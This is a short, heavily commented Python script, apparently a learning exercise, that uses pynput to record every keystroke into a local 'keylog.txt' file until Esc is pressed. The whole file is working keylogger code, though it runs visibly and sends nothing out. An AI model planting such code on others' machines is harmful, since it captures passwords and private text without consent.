from pynput import keyboard
import datetime 

#creating the log file to store keystrokes
LOG_FILE = "keylog.txt"

#this function is called whenver a key is pressed
def on_press (key):

    with open(LOG_FILE, "a") as f: #'a' = append

        try: #try to write the character of the key
            f.write(key.char)

        except AttributeError: #for special keys (e.g:space, enter, shift); they are written in brackets
            if key == keyboard.Key.space:
                f.write(" ") #writes space for spacebar
            elif key == keyboard.Key.enter:
                f.write("\n") #writes new line for enter key
            else:
                f.write(f"[{key.name}]") #writes the special key name in brackets


#this function stops the listener when the 'Esc' key is released
def on_release (key): 

    if key == keyboard.Key.esc: #stops the listener
        print("Esc pressed; process exiting.")
        return False #returning false from a callback will stop the listener (pynput explanation) this stops and exits the program
    

#checks if the file is running directly and is not imported 
#this allows for importing the file into another .py program without auto-starting the keylogger
if __name__ == "__main__": 
    print ("starting keylogger.Press 'Esc' to stop.")

    with open(LOG_FILE, "a") as f: #this adds a timestamp at the start of the logging session
        f.write(f"\n\n\n--- Logging started: {datetime.datetime.now()} ---\n")

    #this starts the keyboard event listener; calls the on_press function upon ket press and the on_release upon key release
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join() #tells the program to keep listening for keyboard events until otherwise(without this the program would start and immediately finish without doing anything)

        